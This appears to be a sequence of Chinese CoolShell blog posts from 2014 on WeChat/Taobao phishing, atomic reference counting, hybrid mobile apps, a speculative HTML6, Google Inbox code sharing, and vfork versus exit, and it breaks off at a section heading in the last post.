微信和淘宝到底是谁先屏蔽谁我并不关心，这里面的商业利益我也不关心，微信是不是支持卖东西我也不关心。我关心的是寒冬文章中所说的微信上有淘宝钓鱼的安全问题。

从技术上来说，我觉得要微信和淘宝一起干这事，单方都不行，需要两边的安全专家一起讨论（如果需要，我可以帮你们约）。我这里给一个可能很不成熟的方案，算是抛砖引玉（我不考虑你们之间的商业竞争，我只从用户的角度出发，客户第一）：

> **我觉得，从业务上来说，淘宝可以在微信上有一个官方的商城。而淘宝的商家，需要取得微信的认证后入住，才能分享相关的商品或店家链接，对此，商家入住，我觉得可通过微信的服务账号与淘宝的商家后台集成可以做到。**
>
> **然后，商家也好，买家也好，他们分享商品只能通过微信官方的商城或是商家的服务账号分享出去，而分享出去的商品信息可以是一个比较unique的形式（比如有一个不能伪造的官方认证的标签），而用户的支付可以通过内置的微信支付也可以通过内置的支付宝（通过唤起App并不是一个好的方式，还是应该你们在服务端进行相互的通信）。**
>
> **然后微信和淘宝双方通过宣传手段告诉全社会，微信里的商品什么才是正规的，才不是钓鱼的，并给教育用户更为安全地使用手机。**

P.S. 我虽然这么说，但从我个人来说，我非常理解微信为了让用户有很好的体验而不让微信成为一个四处都是营销商品的地方。所以，我从个人来说，希望微信不要成为一个商家的营销地。另外，我也知道阿里对移动端的看重，所以，上述的方案虽然对用户体验和安全都比较好，但是从目前商业利益的情况看来基本无法实现。不过我这里也只是抛砖引玉了。

面对安全和用户这两个事，**你们两个中国最大的互联网公司，应该带头做好榜样，你们都是不缺钱的公司，应该更多的承担起社会的责任，真正为用户做点什么，而不是整天想着流量入口，互相屏蔽，互相指责，想着自己能有多少用户，这TMD太LOW了，和你们的地位完全不符。所以，从站在用户的角度上来说，我希望微信和淘宝都能站在用户的角度上思考问题，一起合作来真正的为用户更好的服务。**

（全文完）

# LINUS：为何对象引用计数必须是原子的

#####  [2014年12月31日 ](https://coolshell.cn/articles/16910.html) [Leo](https://coolshell.cn/articles/author/full_of_bull) 评论 [37 条评论](https://coolshell.cn/articles/16910.html#comments) 50,893 人阅读

**（感谢网友** [**@我的上铺叫路遥**](http://weibo.com/fullofbull) **投稿）**

Linus大神又在rant了！这次的吐槽对象是时下很火热的**并行技术(parellism)**，并直截了当地表示[并行计算是浪费所有人时间](http://www.vaikan.com/linus-parallel-computing-is-a-huge-waste-of-everybodys-time/)([“The whole “let’s parallelize” thing is a huge waste of everybody’s time.”](http://www.realworldtech.com/forum/?threadid=146066&curpostid=146227))。大致意思是说**乱序性能快、提高缓存容量、降功耗**。当然笔者不打算正面讨论并行的是是非非（过于宏伟的主题），因为Linus在另一则[帖子](http://www.realworldtech.com/forum/?threadid=146066&curpostid=146183)中举了对象**引用计数(reference counting)**的例子来说明并行的复杂性。

在Linus回复之前有人指出**对象需要锁机制的情况下，引用计数的原子性问题：**

> Since it is being accessed in a multi-threaded way, via multiple access paths, generally it needs its own mutex — otherwise, reference counting would not be required to be atomic and a lock of a higher-level object would suffice.
>
> 由于（对象）通过多线程方式及多种获取渠道，一般而言它需要自身维护一个互斥锁——否则引用计数就不要求是原子的，一个更高层次的对象锁足矣。

而Linus不那么认为：

> The problem with reference counts is that you often need to take them *before* you take the lock that protects the object data.
>
> 引用计数的问题在于你经常需要在对象数据**上锁保护之前**完成它。

The thing is, you have two different cases:

问题有两种情况：

**– object \*reference\* 对象引用**

**– object data 对象数据**

and they have completely different locking.

**它们锁机制是完全不一样的。**



Object data locking is generally per-object. Well, unless you don’t have huge scalability issues, in which case you may have some external bigger lock (extreme case: one single global lock).

对象数据保护一般是一个对象拥有一个锁，假设你没有海量扩展性问题，不然你需要一些外部大一点的锁（极端的例子，一个对象一个全局锁）。

But object *referencing* is mostly about finding the object (and removing/freeing it). Is it on a hash chain? Is it in a tree? Linked list? When the reference count goes down to zero, it’s not the object data that you need to protect (the object is not used by anything else, so there’s nothing to protect!), it’s the ways to find the object you need to protect.

但对象引用主要关于对象的寻找（移除或释放），它是否在哈希链，一棵树或者链表上。**当对象引用计数降为零，你要保护的不是对象数据，因为对象没有在其它地方使用，你要保护的是对象的寻找操作。**

And the lock for the lookup operation cannot be in the object, because – by definition – you don’t know what the object is! You’re trying to look it up, after all.

而且查询操作的锁不可能在对象内部，因为根据定义，你还不知道这是什么对象，你在尝试寻找它。

So generally you have a lock that protects the lookup operation some way, and the reference count needs to be atomic with respect to that lock.

因此一般你要对查询操作上锁，而且引用计数相对**那个锁**来说是原子的（译者注：查询锁不是引用计数所在的对象所有，不能保护对象引用计数，后面会解释为何引用计数变更时其所在对象不能上锁）。

And yes, that lock may well be sufficient, and now you’re back to non-atomic reference counts. But you usually don’t have just one way to look things up: you might have pointers from other objects (and that pointer is protected by the object locking of the other object), but there may be multiple such objects that point to this (which is why you have a reference count in the first place!)

当然这个锁是充分有效的，现在假设引用计数是非原子的，但你常常不仅仅使用一种方式来查询：你可能拥有其它对象的指针（这个指针又被其它对象的对象锁给保护起来），但同时还会有多个对象指向它（这就是为何你第一时间需要引用计数的理由）。

See what happens? There is no longer one single lock for lookup. Imagine walking a graph of objects, where objects have pointers to each other. Each pointer implies a reference to an object, but as you walk the graph, you have to release the lock from the source object, so you have to take a new reference to the object you are now entering.

看看会发生什么？查询不止存在一个锁保护。你可以想象走过一张对象流程图，其中对象存在指向其它对象的指针，每个指针暗含了一次对象引用，但当你走过这个流程图，你必须释放源对象的锁，而你进入新对象时又必须增加一次引用。

And in order to avoid deadlocks, you can not in the general case take the lock of the new object first – you have to release the lock on the source object, because otherwise (in a complex graph), how do you avoid simple ABBA deadlock?

而且为了避免死锁，你一般不能立即对新对象上锁——你必须释放源对象的锁，否则在一个复杂流程图里，你如何避免**ABBA死锁**（译者注：假设两个线程，一个是A->B，另一个B->;A，当线程一给A上锁，线程二给B上锁，此时两者谁也无法释放对方的锁）？

So atomic reference counts fix that. They work because when you move from object A to object B, you can do this:

原子引用计数修正了这一点，当你从对象A到对象B，你会这样做：

(a) you have a reference count to A, and you can lock A

对象A增加一次引用计数，并上锁。

(b) once object A is locked, the pointer from A to B is stable, and you know you have a reference to B (because of that pointer from A to B)

对象A一旦上锁，A指向B的指针就是稳定的，于是你知道你引用了对象B。

(c) but you cannot take the object lock for B (ABBA deadlock) while holding the lock on A

但你不能在对象A上锁期间给B上锁（ABBA死锁）。

(d) increment the atomic reference count on B

对象B增加一次原子引用计数。

(e) now you can drop the lock on A (you’re “exiting” A)

现在你可以扔掉对象A的锁（退出对象A）。

(f) your reference count means that B cannot go away from under you despite unlocking A, so now you can lock B.

对象B的原子引用计数意味着即使给A解锁期间，B也不会失联，现在你可以给B上锁。

See? Atomic reference counts make this kind of situation possible. Yes, you want to avoid the overhead if at all possible (for example, maybe you have a strict ordering of objects, so you know you can walk from A to B, and never walk from B to A, so there is no ABBA deadlock, and you can just lock B while still holding the lock on A).

看见了吗？原子引用计数使这种情况成为可能。是的，你想尽一切办法避免这种代价，比如，你也许把对象写成严格顺序的，这样你可以从A到B，绝不会从B到A，如此就不存在ABBA死锁了，你也就可以在A上锁期间给B上锁了。

But if you don’t have some kind of forced ordering, and if you have multiple ways to reach an object (and again – why have reference counts in the first place if that isn’t true!) then atomic reference counts really are the simple and sane answer.

但如果你无法做到这种强迫序列，如果你有多种方式接触一个对象（再一次强调，这是第一时间使用引用计数的理由），这样，原子引用计数就是简单又理智的答案。

If you think atomic refcounts are unnecessary, that’s a big flag that you don’t actually understand the complexities of locking.

**如果你认为原子引用计数是不必要的，这就大大说明你实际上不了解锁机制的复杂性。**

Trust me, concurrency is hard. There’s a reason all the examples of “look how easy it is to parallelize things” tend to use simple arrays and don’t ever have allocations or freeing of the objects.

相信我，**并发设计是困难的。**所有关于“并行化如此容易”的理由都倾向于使用简单数组操作做例子，甚至不包含对象的分配和释放。

People who think that the future is highly parallel are invariably completely unaware of just how hard concurrency really is. They’ve seen Linpack, they’ve seen all those wonderful examples of sorting an array in parallel, they’ve seen all these things that have absolutely no actual real complexity – and often very limited real usefulness.

那些认为未来是高度并行化的人一成不变地完全没有意识到并发设计是多么困难。他们只见过[Linpack](https://en.wikipedia.org/wiki/LINPACK)，他们只见过并行技术中关于数组排序的一切精妙例子，他们只见过一切绝不算真正复杂的事物——对真正的用处经常是非常有限的。

（译者注：当然，我无意借大神之口把技术宗教化。实际上Linus又在另一篇[帖子](http://www.realworldtech.com/forum/?threadid=146066&curpostid=146198)中综合了对并行的评价。）

Oh, I agree. My example was the simple case. The really complex cases are much worse.

哦，我同意。我的例子还算简单，真正复杂的用例更糟糕。

I seriously don’t believe that the future is parallel. People who think you can solve it with compilers or programming languages (or better programmers) are so far out to lunch that it’s not even funny.

我严重不相信未来是并行的。有人认为你可以通过编译器，编程语言或者更好的程序员来解决问题，他们目前都是神志不清，没意识到这一点都不有趣。

Parallelism works well in simplified cases with fairly clear interfaces and models. You find parallelism in servers with independent queries, in HPC, in kernels, in databases. And even there, people work really hard to make it work at all, and tend to expressly limit their models to be more amenable to it (eg databases do some things much better than others, so DB admins make sure that they lay out their data in order to cater to the limitations).

并行计算可以在简化的用例以及具备清晰的接口和模型上正常工作。你发现并行在服务器上独立查询里，在高性能计算(High-performance computing)里，在内核里，在数据库里。即使如此，人们还得花很大力气才能使它工作，并且还要明确限制他们的模型来尽更多义务（例如数据库要想做得更好，数据库管理员得确保数据得到合理安排来迎合局限性）。

Of course, other programming models can work. Neural networks are inherently very parallel indeed. And you don’t need smarter programmers to program them either..

当然，其它编程模型倒能派上用场，神经网络(neural networking)天生就是非常并行化的，你不需要更聪明的程序员为之写代码。

#### 参考资料

- [Real World Technologies](http://www.realworldtech.com/)：Linus常去“灌水”的一个论坛，讨论未来机器架构（看名字就知道Linus技术偏好，及其之前对虚拟化技术(virtualization)的[吐槽](http://www.networkworld.com/article/2220440/opensource-subnet/torvalds-says---virtualization-is-evil-.html)）
- [多线程程序中操作的原子性](http://www.parallellabs.com/2010/04/15/atomic-operation-in-multithreaded-application/)：解释为什么i++不是原子操作
- [ Concurrency Is Not Parallelism](http://www.vaikan.com/docs/Concurrency-is-not-Parallelism)：Go语言之父Rob Pike幻灯片解释“并发”与“并行”概念上的区别

（全文完）

# DHH 谈混合移动应用开发

#####  [2014年12月15日 ](https://coolshell.cn/articles/12225.html) [Jnj](https://coolshell.cn/articles/author/jnj) 评论 [27 条评论](https://coolshell.cn/articles/12225.html#comments) 32,235 人阅读

 

![1053-DHH](photo/1053-DHH-150x150.jpg)David，Ruby on Rails 作者，37signals 合伙人

畅销书作家、演说家、赛车手、业余摄影师、顾家好男人

 

[37signals](https://37signals.com/) 在2013年2月发布了 Basecamp 的 iPhone app，在此之前我们就使用原生开发（native）还是混合开发（hybrid）做了许多尝试。在2012年项目启动的时候，大多数人都倾向于原生开发。

Facebook 在2012年发布了他们新的 iOS app，为了获得更好的用户体验，他们放弃了原来的 HTML5 混合开发方式。考虑到2010～2011年的时候，HTML 在移动端的性能确实不尽如人意，这个决定在当时看来也在情理之中。2010年的时候我们觉得 iPhone 3G/3GS 够眩够快，但按照现在的标准来看它们就太慢了。因此在为移动应用开发做架构设计时，我们需要考虑新的移动设备的计算能力，而不是那些老的过时的设备。

目录



[移动开发架构设计不需要过多考虑设备的性能](https://coolshell.cn/articles/12225.html#移动开发架构设计不需要过多考虑设备的性能)[第一代产品：原生外壳(native shell)＋嵌套WebView](https://coolshell.cn/articles/12225.html#第一代产品：原生外壳native_shell＋嵌套WebView)[第二代产品：原生外壳＋原生导航界面](https://coolshell.cn/articles/12225.html#第二代产品：原生外壳＋原生导航界面)[因地制宜地运用原生开发方式](https://coolshell.cn/articles/12225.html#因地制宜地运用原生开发方式)[混合开发模式使用的技术](https://coolshell.cn/articles/12225.html#混合开发模式使用的技术)[混合开发模式对原生开发模式的挑战](https://coolshell.cn/articles/12225.html#混合开发模式对原生开发模式的挑战)

#### 移动开发架构设计不需要过多考虑设备的性能

我们从一些测试中得出的一个结论是：现在的移动设备计算能力都很强，运行原生应用和 HTML 应用的效果差别不大，而 HTML 开发的成本则要比原生开发小得多。

当然这个结论在某些领域并不太适用。如果你要开发一个 3D 游戏，原生开发方式能够带来更好的游戏体验。但如果你的移动应用象 Basecamp 一样侧重信息处理，为了降低开发成本，你就可以考虑混合开发方式。我们就是如此，下面是我们三代移动产品的发展轨迹：



#### 第一代产品：原生外壳(native shell)＋嵌套WebView

![1159-basecamp-app-phones](photo/1159-basecamp-app-phones-300x242.jpg)

这个版本就是一个简单的原生外壳负责界面导航，嵌套一个 WebView 来显示 Basecamp Rail application，显示的基本上都是我们移动网站页面，再加上一些特殊的样式。

在移动网站的页面上嵌套一个原生的壳，听起来还是 Web 页面，但实际带给用户的体验确是非常不同。用户可以在 Apple App Store 找到我们的 app，他们一旦登录 app 后可以再也不用重新登录（移动版本的 Safari 似乎会经常清空 cookie，让你不得不重新登录）。我们的 app 大受欢迎，用户评分在4和5之间。

整个 app 由一名程序员和一名设计师开发，成本不高，因为我们可以在已有的移动网站的基础上开发。

如果我们当初开发完全原生的 app，用10个人的团队1年半的时间也未必能完成。

 

#### 第二代产品：原生外壳＋原生导航界面

![1543-unnamed](photo/1543-unnamed-187x300.png)

几个月前发布的 Basecamp Android app 是我们的第二代产品，我们在其中做了大量的改进。

从第一代 iPhone app 中我们感受到了原生导航界面的威力，所以在 Android 版本中，我们由 HTML 页面导航转向了原生导航界面。我们从 HTML 页面生成原生导航界面，用户体验更加流畅，原生界面和 HTML 页面的体验差别越来越小，甚至很难区分哪些是原生部分，哪些是 HTML 。

Android 版本是由一两个程序员和一个设计师开发（50%投入）完成的。我们重用了移动站点和 iPhone app 中使用的所有 webview，大大提高了开发效率，同时用户也很买账，超过1000名用户打了4.5~5的高分。

很多公司在抱怨他们的 iOS 移动项目进展缓慢，Android 项目似乎更是如此。或许他们已经习惯了 iOS 项目的开发流程，也许是因为 Android 的屏幕碎片化问题，但是这些对我们来说那都不是事。我们推出的 Android app 表现良好，重用了95%的代码，开发团队也一直保持在小规模。

 

#### 因地制宜地运用原生开发方式

目前我们正在开发第三代产品，发布的平台暂时保密，不过你应该也不难猜到。在前两代产品中，我们增加了原生导航界面的使用，同时进一步确定了以 webview 为核心的整体架构。在第三代产品中，我们将因地制宜地选择需要使用原生开发的功能，好钢要用在刀刃上。

从之前的100% HTML，到现在的90% HTML +10%原生，我们会选择最值得做原生开发的那10%的部分，最终目的是让 app 原生部分和 HTML 部分的体验没有太大区别。

 

#### 混合开发模式使用的技术

混合开发模式在技术很简单，主要是处理 webview 的集成、Web 页面的加载，以及原生内容和 HTML 内容之间的交叉链接，其实可能比你想像的还要简单得多。

HTML 方面，我们的 Rails Web 应用支持 Web 和移动两大平台，其中 [Rails 4.1 feature of variants](http://edgeguides.rubyonrails.org/4_1_release_notes.html#action-pack-variants) 起了很大的作用。

这也很大程度上有助于我们发布新功能。设想一下如果我们每次需要更新这么多平台：Rails desktop app, a Rails API app, a client-side MVC app, a mobile web wrapper app, an Android app, and an iPhone app，像我们这样只有10个程序员和7个设计师的公司根本无力承担如此巨大的工作量。

除了工作量的减轻，bug 修复效率也提高了，因为大部分的代码逻辑是在 Web 服务器端，我们可以随时修改代码并发布，不用通过 Apple App Store 的审批流程。所以我们的移动 app 和 Web 应用一样，也是持续部署。

就如我之前提到的，混合模式开发并不适用于所有情况。在2010年以前，那时手机的处理能力都不强，所以 HTML/JS 的体验并不好，用户也不喜欢。但是时过境迁，现在手机的处理能力大大提高了，HTML/JS 的性能也不再是一个问题。

 

#### 混合开发模式对原生开发模式的挑战

混合开发模式在降低开发复杂度方面有它的优势，如果你的产品是以显示和处理信息为主，我认为都可以不同程度地采用这个模式。

对于小型团队和公司而言，并不一定需要采用 iOS 原生 app 先行的模式。使用混合模式，不需要你重头开发一个 app，这样可以降低维护成本，将来扩展到其他平台也更为方便。

当然我知道会有很多人质疑这个模式，或许因为他们的 app 中有很多地方需要原生开发（也许仅仅是他们自己这样认为罢了）。又或许他们已经花了很多时间让 app 里的 UITableView 看起来非常漂亮，以致如果其他地方不这样的话显得不是太完美。再或许大公司就是喜欢耗时耗力的原生开发，有钱就是这么任性。

无论怎样，混合开发当下应该能够成为我们移动开发策略的一个选择。如果你认为这是一个好的选择，那么恭喜你，尽情愉快地玩耍吧！

 

*原文链接：[Hybrid sweet spot: Native navigation, web content](https://signalvnoise.com/posts/3743?utm_campaign=iOS_Dev_Weekly_Issue_175&utm_medium=email&utm_source=iOS%2BDev%2BWeekly)*

 

下面补充一些 David 答读者问：

 

Mike Waite @ 2014-05-08：我很好奇你是如何决定哪些功能要用原生开发？
David @ 2014-05-08：主要靠感觉，这毕竟不是一门科学。如果你感觉你app的某一部分如果用原生开发会更好些，可以尝试做快速原型（spike）。很多时候我们通过这种方式证明我们的想法其实是错的。当然如果你需要使用到手机上的功能如：摄像和其他设备时，HTML目前还不太适用，不过永远也不要把话说死。

 

Mike Parsons @ 2014-05-08：好文。很好奇你们是否使用 PhoneGap 或者 Cordova 这样的框架，或者你们自己开发了一个？
David @ 2014-05-08：我们没有使用任何框架。（此处省去xxx字）

 

Derick @ 2014-05-08：你怎样解决 Android 浏览器渲染速度慢的问题？这也是 Android 平台上更多人倾向开发原生app得原因。
David @ 2014-05-08：不知道你这个结论是近期的还是以前的？Basecamp 的 Android app 在我的 Nexus 5 和 HTC One 上面运行得非常流畅。
Derick @ 2014-05-08：就是最近。我猜测可能和你使用JavaScript的多少有关系。因为以我个人的经验，Android 上 JavaScript 的运行速度非常慢。如果你感兴趣可以看看下面的文章：https://www.timroes.de/2013/11/23/old-webview-vs-chromium-webview/
David @ 2014-05-08：我们使用了很多JavaScript，当然没有 Web MVC 客户端用得那样多。另外我们使用了 Turbolinks ：）

# HTML6 展望

#####  [2014年12月06日 ](https://coolshell.cn/articles/12206.html) [Jnj](https://coolshell.cn/articles/author/jnj) 评论 [39 条评论](https://coolshell.cn/articles/12206.html#comments) 51,502 人阅读



### ![html6](photo/html6.jpeg)

### HTML5 概述

HTML5 是 HTML 语言最受欢迎的版本之一，它支持音频和视频、离线存储、移动端、和标签属性等等。还提供了<article>, <section>, <header>这样的标签来帮助开发者更好地组织页面内容。然而 HTML5 规范仍然没有最后定稿，并且它并不是一个真正意义上的语义标记语言。

### HTML6 展望

你有没有曾经希望能在 HTML 中使用自定义标签？比如：使用<logo>来显示你的网站logo，还有使用<toolbar>来显示工具栏等等。我们经常使用<div id=”container”>和<div id=”wrapper”>来组织页面，在 HTML6 里我们希望可以直接使用象<container>和<wrapper>这样的自定义标签。

和 XML 一样，HTML6 应该支持 namespace（命名空间），如：xmlns:xhtml=”http://www.w3.org/1999/xhtml”

HTML6 代码样例：



```
<!DOCTYPE html>
 <html:html>
 <html:head>
 <html:title>A Look Into HTML6</html:title>
 <html:meta type="title" value="Page Title">
 <html:meta type="description" value="HTML example with namespaces">
 <html:link src="css/mainfile.css" title="Styles" type="text/css">
 <html:link src="js/mainfile.js" title="Script" type="text/javascript">
 </html:head>
 <html:body>
 <header>
 <logo>
 <html:media type="image" src="images/xyz.png">
 </logo>
 <nav>
 <html:a href="/img1">a1</a>
 <html:a href="/img2">a2</a>
 </nav>
 </header>
 <content>
 <article>
 <h1>Heading of main article</h1>
 <h2>Sub-heading of main article</h2>
 <p>[...]</p>
 <p>[...]</p>
 </article>
 <article>
 <h1>The concept of HTML6</h1>
 <h2>Understanding the basics</h2>
 <p>[...]</p>
 </article>
 </content>
 <footer>
 <copyright>This site is © to Anonymous 2014</copyright>
 </footer>
 </html:body>
 </html:html>
```

在上面的代码中，你也许注意到了一些奇怪的<html:x>标签，它们是 W3C 和 HTML6 规范中在命名空间里定义的标签。例如：<html:title>负责设定你浏览器的标题栏文字，<html:media>负责显示图片等等。用户可以自己定义标签以便 JavaScript 和 CSS 识别和处理，这样页面代码会更易读，语义更清晰。

### HTML6 APIs

HTML6 的标签前带有命名空间，如：<html:html>, <html:head>等等。

1. <html:html>

```
<!DOCTYPE html>
 <html:html>// this is equivalent to <html> tag written in previous HTML versions
 <!-- sample of HTML document -->
 </html:html>
```

2. <html:head> 和 <head> 标签一样。

```
<!DOCTYPE html>
 <html:html>
 <html:head>
 <!-- Main content would come here, like the <html:title> tag -->
 </html:head>
 </html:html>
```

3. <html:title> 和 <title> 标签类似。

```
<!DOCTYPE html>
 <html:html>
 <html:head>
 <html:title>A Look Into HTML6</html:title>
 </html:head>
 </html:html>
```

4. <html:meta> 和 <meta> 标签类似，不同之处在于，在 HTML5 中你只能使用标准的元数据类型，如：”keywords”, “description”, “author”等，而在 HTML6 中你可以使用任何元数据类型。

```
<!DOCTYPE html>
 <html:html>
 <html:head>
 <html:title>A Look Into HTML6</html:title>
 <html:meta type="description" value="HTML example with namespaces">
 </html:head>
 </html:html>
```

5. <html:link> 和 HTML6 之前版本的 <link> 标签类似。

```
<!DOCTYPE html>
 <html:html>
 <html:head>
 <html:title>A Look Into HTML6</html:title>
 <html:link src="js/mainfile.js" title="Script" type="text/javascript">
 </html:head>
 </html:html>
```

6. <html:body> 和 <body> 标签一样。

```
<!DOCTYPE html>
 <html:html>
 <html:head>
 <html:title>A Look Into HTML6</html:title>
 </html:head>
 <html:body>
 <!-- This is where your website content is placed -->
 </html:body>
 </html:html>
```

7. <html:a> 和 <a> 标签类似，区别是 <html:a> 只有 “href” 一个属性。

```
<!DOCTYPE html>
 <html:html>
 <html:head>
 <html:title>A Look Into HTML6</html:title>
 </html:head>
 <html:body>
 <html:a href="http://siteurl">Go to siteurl.com!</html:a>
 </html:body>
 </html:html>
```

8. <html：button> 和 <button> 及 <input type=”button”> 一样。

```
<!DOCTYPE html>
 <html:html>
 <html:head>
 <html:title>A Look Into HTML6</html:title>
 </html:head>
 <html:body>
 <html:button>Click Here</html:button>
 </html:body>
 </html:html>
```

9. <html:media> 涵盖 <img>, <video>, <embed> 等标签的所有功能。<html:media> 的好处是你不用根据不同的媒体文件类型使用不同的标签，媒体的类型由浏览器从文件内容（类型属性，扩展名，和MIME type）中来判断。

```
<!DOCTYPE html>
 <html:html>
 <html:head>
 <html:title>A Look Into HTML6</html:title>
 </html:head>
 <html:body>
 <!-- Image would come here -->
 <html:media src="img1/logo.jpg" type="image">
 <!-- Video doesn't need a type -->
 <html:media src="videos/slide.mov">
 </html:body>
 </html:html>
```

### 标签类型(Tag types)概述

和 HTML5 一样， HTML6 也有两种标签类型：单标签（single tag) 和双标签（double tag）

```
<html:meta type="author" content="single tag">
 <html:meta type="author" content="double tag" />
```

单标签不需要结束符’/’

### 结语

HTML6 规范还未发布，本文原作者 [Oscar Godson](http://html6spec.com/) 只是为我们提供了一个对 HTML6 规范的展望，或者说他希望 HTML6 能够支持的一些新特性。

原文链接：[A Look Into HTML6 – What Is It, and What Does it Have to Offer?](http://java.dzone.com/articles/look-html6-what-it-and-what) 

# GOOGLE INBOX如何跨平台重用代码？

#####  [2014年11月26日 ](https://coolshell.cn/articles/12136.html) [Jnj](https://coolshell.cn/articles/author/jnj) 评论 [31 条评论](https://coolshell.cn/articles/12136.html#comments) 30,554 人阅读

原文链接《[How Google Inbox shares 70% of its code across Android, iOS, and the Web](http://arstechnica.com/information-technology/2014/11/how-google-inbox-shares-70-of-its-code-across-android-ios-and-the-web)》

[![inbox2-640x264](photo/inbox2-640x264-300x123.jpg)](https://coolshell.cn/wp-content/uploads/2014/11/inbox2-640x264.jpg)

开发一个移动应用在当下并不是一件容易的事情。如果想要获得最多的用户，你的应用通常需要覆盖 iOS, Android, 和 Web 三大平台。这就意味着同一个应用需要开发三个版本，使用 Objective-C 或者 Swift 开发 iOS 版本，使用 Java 开发 Android 版本，使用 JavaScript/CSS/HTML5 开发 Web 版本。工作量增大的同时也意味着有更多的 bug 需要修复。

这个问题也是 Google 在开发 Google Inbox 时致力要解决的。在最近发布的这款应用中，Google 使用了一些工具实现了70%的代码跨平台复用。

Google Inbox 覆盖 iOS, Android, Web 三个平台，它们使用的是同一个后台代码逻辑，只是前端的用户体验和平台相关特性的实现有所不同。Google 自主开发了一套辅助工具将 Android 版本的 Java 代码逻辑编译为 Objective-C (针对 iOS 平台) 和 JavaScript (针对 Web 浏览器)。 Java 到 JavaScript 的编译由 Google Web Toolkit SDK 完成，Java 到 Objective-C 的编译则由 J2ObjC （[j2objc.org](https://coolshell.cn/articles/j2objc.org)）来完成。

J2ObjC 是一个开源项目，由 Google 在2013年发布。Google Sheets (Google Docs 中的电子表格部分) 也使用了 J2ObjC，而 Google Inbox 则是目前使用 J2Objc 最多的 Google 项目。

Google Inbox 复用的代码逻辑包括：对话 (conversations)，提醒 (reminders)，联系人 (contacts)。还有网络相关功能和离线同步。这些代码逻辑的复用节省了大量的时间和成本。

在产品设计时，Google 将这些可复用功能划分为抽象的逻辑概念，比如：提醒的逻辑放在 “reminder.java” 中，可以被 Android UI 调用。对 iOS 版本而言，J2ObjC 将 “reminder.java” 编译成 Objective-C 代码，再由 iOS UI 调用。

Google 没有跨平台编译 UI 部分的代码，因为不同平台的UI特性各有不同，盲目统一会导致非常糟糕的用户体验。代码复用只是针对可以共享的后台逻辑，前端的UI实现是完全原生 (native) 的。这与 Xamarin (一个基于 Microsoft C# 的跨平台移动开发工具) 提出的概念类似。

跨平台代码复用通常会带来一些性能上的问题。Garrick Toubassi，Engineering Director 和 Google Inbox 项目组成员，对此表示： “性能上的影响如果有的话，也可以说是微不足道的。我们做过大量的性能测试。因为没有加入额外的中间层来处理跨平台兼容性，所有代码最后都是平台原生代码。J2ObjC 编译生成的目标代码和 Java 源代码拥有大致相同的对象数量和对象图谱复杂度 (object graph complexity) ”。

Google 使用的整套方法解决了跨平台移动开发中的一个很重要的问题，同时也推进了安卓先行 (Android-first) 的移动开发策略。

更多 Google Inbox 文章请猛戳 [Gmail 官方博客](http://gmailblog.blogspot.com.au/2014/11/going-under-hood-of-inbox.html)。	

# VFORK 挂掉的一个问题

#####  [2014年11月21日 ](https://coolshell.cn/articles/12103.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [46 条评论](https://coolshell.cn/articles/12103.html#comments) 48,180 人阅读

![tux-fork](photo/tux-fork-298x300.gif)在知乎上，有个人问了这样的[一个问题](http://www.zhihu.com/question/26591968)——为什么vfork的子进程里用return，整个程序会挂掉，而且exit()不会？并给出了如下的代码，下面的代码一运行就挂掉了，但如果把子进程的return改成exit(0)就没事。

我受邀后本来不想回答这个问题的，因为这个问题明显就是RTFM的事，后来，发现这个问题放在那里好长时间，而挂在下面的几个答案又跑偏得比较严重，我觉得可能有些朋友看到那样的答案会被误导，所以就上去回答了一下这个问题。

下面我把问题和我的回答发布在这里，也供更多的人查看。

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void) {
    int var;
    var = 88;
    if ((pid = vfork()) < 0) {
        printf("vfork error");
        exit(-1);
    } else if (pid == 0) { /* 子进程 */
        var++;
        return 0;
    }
    printf("pid=%d, glob=%d, var=%d\n", getpid(), glob, var);
    return 0;
}
```



#### **基础知识**

首先说一下fork和vfork的差别：

- fork 是 创建一个子进程，并把父进程的内存数据copy到子进程中。
- vfork是 创建一个子进程，并和父进程的内存数据share一起用。

这两个的差别是，一个是copy，一个是share。（关于fork，可以参看酷壳之前的《[一道fork的面试题](https://coolshell.cn/articles/7965.html)》）

你 man vfork 一下，你可以看到，vfork是这样的工作的，

1）保证子进程先执行。
2）当子进程调用exit()或exec()后，父进程往下执行。

那么，为什么要干出一个vfork这个玩意？ 原因在man page也讲得很清楚了：

> **Historic Description**
>
> Under Linux, fork(2) is implemented using copy-on-write pages, so the only penalty incurred by fork(2) is the time and memory required to duplicate the parent’s page tables, and to create a unique task structure for the child. **However, in the bad old days a fork(2) would require making** **a complete copy of the caller’s data space, often needlessly, since usually immediately afterwards an exec(3) is done. Thus, for greater efficiency, BSD introduced the vfork() system call, which did not fully copy the address space of the parent process, but borrowed the parent’s mem****ory and thread of control until a call to execve(2) or an exit occurred.** The parent process was suspended while the child was using its resources. The use of vfork() was tricky: for example, not modifying data in the parent process depended on knowing which variables are held in a register.

意思是这样的—— **起初只有fork，但是很多程序在fork一个子进程后就exec一个外部程序，于是fork需要copy父进程的数据这个动作就变得毫无意了，而且这样干还很重**（注：后来，fork做了优化，详见本文后面）**，所以，BSD搞出了个父子进程共享的 vfork，这样成本比较低。因此，vfork本就是为了exec而生。**

#### **为什么return会挂掉，exit()不会？**

从上面我们知道，**结束子进程的调用是exit()而不是return，如果你在vfork中return了，那么，这就意味main()函数return了，注意因为函数栈父子进程共享，所以整个程序的栈就跪了。**

如果你在子进程中return，那么基本是下面的过程：

**1）子进程的main() 函数 return了，于是程序的函数栈发生了变化。**

**2）而main()函数return后，通常会调用 exit()或相似的函数**（如：_exit()，exitgroup()）

**3）这时，父进程收到子进程exit()，开始从vfork返回，但是尼玛，老子的栈都被你子进程给return干废掉了，你让我怎么执行？**（注：栈会返回一个诡异一个栈地址，对于某些内核版本的实现，直接报“栈错误”就给跪了，然而，对于某些内核版本的实现，于是有可能会再次调用main()，于是进入了一个无限循环的结果，直到vfork 调用返回 error）

好了，现在再回到 return 和 exit，return会释放局部变量，并弹栈，回到上级函数执行。exit直接退掉。如果你用c++ 你就知道，return会调用局部对象的析构函数，exit不会。（注：exit不是系统调用，是glibc对系统调用 _exit()或_exitgroup()的封装）

可见，**子进程调用exit() 没有修改函数栈，所以，父进程得以顺利执行**。

**但是！注意！如果你调用 exit() 函数，还是会有问题的，正确的方法应该是调用 _exit() 函数，因为 exit() 函数 会 flush 并 close 所有的 标准 I/O ，这样会导致父进程受到影响。（这个情况在fork下也会受到影响，会导致一些被buffer的数据被flush两次，这里可以参看《[一个fork的面试题](https://coolshell.cn/articles/7965.html)》）**

#### 关于fork的优化

